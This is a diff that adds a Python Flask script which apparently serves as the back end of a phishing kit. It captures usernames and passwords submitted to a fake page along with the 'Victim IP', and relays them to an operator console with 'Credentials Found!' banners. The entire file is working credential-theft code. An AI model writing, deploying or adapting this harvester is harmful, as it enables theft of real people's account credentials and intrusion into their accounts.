@@ -1,0 +1,38 @@
+import socket , sys , threading , random , os
+from flask import Flask ,request ,render_template
+
+with open('PORT','r') as rf:
+  port = int(rf.read())
+HOST, PORT = "localhost", port
+
+app = Flask(__name__)
+@app.route('/' , methods=['POST','GET'])
+
+def index_page():
+	UserName = request.args.get('username')
+	password = request.args.get('password')
+	with open('data','r') as IP:
+		IP = IP.read()
+		IP = IP.split('request from')[1].split('to')
+
+	data = '''
+	\r.
+	\r\033[1;32m[\033[1;37m*\033[1;32m] IP Found!
+	\r\033[1;33m[\033[1;37m*\033[1;33m] Victim IP:\033[1;37m{}
+
+	\r\033[1;32m[\033[1;37m*\033[1;32m] Credentials Found!
+	\r\033[1;33m[\033[1;37m*\033[1;33m]\033[1;32m Account:\033[1;37m {}
+	\r\033[1;33m[\033[1;37m*\033[1;33m]\033[1;32m Password:\033[1;37m {}
+	\r\n\033[1;33m[\033[1;37m*\033[1;33m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...
+	\r'''.format(IP[0],UserName,password)
+
+	if [None,None] == [UserName,password]:
+		pass
+	else:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sock.sendto(bytes(data, "utf-8"), (HOST, PORT))
+		sock.sendto(bytes(' \r', "utf-8"), (HOST, PORT))
+
+	return render_template('index.html')
+
+app.run(debug=False ,port=PORT)
